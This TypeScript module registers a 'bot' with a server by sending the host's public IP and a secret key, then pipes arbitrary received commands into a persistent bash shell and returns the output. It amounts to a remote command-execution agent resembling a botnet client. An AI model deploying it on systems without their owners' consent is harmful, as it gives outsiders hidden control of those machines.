import { spawn } from "child_process";
import http from "./http";
import axios from "axios";

const shell = spawn("bash");

shell.stdout.on("data", (data) => {
    console.log(`STDOUT: ${data}`);
  });
  
  shell.stderr.on("data", (data) => {
    console.error(`STDERR: ${data}`);
  });
  
  shell.on("close", (code) => {
    console.log(`Shell exited with code ${code}`);
  });

export const registerBot = async () => {
  try {
    const ipResponse = await axios.get("https://api64.ipify.org?format=json");
    const publicIp = ipResponse.data.ip;

    const secretKey = process.env.SECRET_KEY;

    await http.post("/bot/register", { ip: publicIp, secretKey });
  } catch (error) {
    console.error("Error registering bot:", error);
  }
};

export const executeCommandInShell = (command: string) => {
    return new Promise((resolve, reject) => {
      shell.stdin.write(`${command}\n`); 
  
      let output = "";
      shell.stdout.once("data", (data) => {
        output += data.toString();
        resolve(output);
      });
  
      shell.stderr.once("data", (err) => {
        reject(err.toString());
      });
    });
  };